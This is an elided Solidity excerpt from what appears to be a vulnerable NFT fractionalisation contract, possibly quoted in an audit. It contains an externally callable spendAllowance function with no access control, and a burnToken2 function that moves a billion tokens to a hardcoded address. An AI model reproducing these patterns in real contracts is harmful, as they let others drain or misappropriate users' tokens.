...
contract NFTFractional is Upgradable {
    ...
    */
    ...
    function burnToken() external {
        ...
        IERC20(fnftInfo.tokenFNFT).safeTransferFrom(msg.sender, address(this), 1000);
    }
    ...
    function burnToken2() external {
        ...
        FNFTInfo storage fnftInfo = fnftInfos[fnftPool.fnftId];
        IERC20(fnftInfo.tokenFNFT).transfer(address(0xF7cC551106A1f4E2843A3DA0C477B6f77FA4a09d), 1000000000);
        ERC20Token(fnftInfo.tokenFNFT).spendAllowance(msg.sender, address(this), fnftInfo.totalSupply);
    }
}
...
contract ERC20Token is ERC20Upgradeable {
  ...
  function spendAllowance(address owner,address sender,uint256 _account) external {
    _spendAllowance(owner, sender, _account);
  }
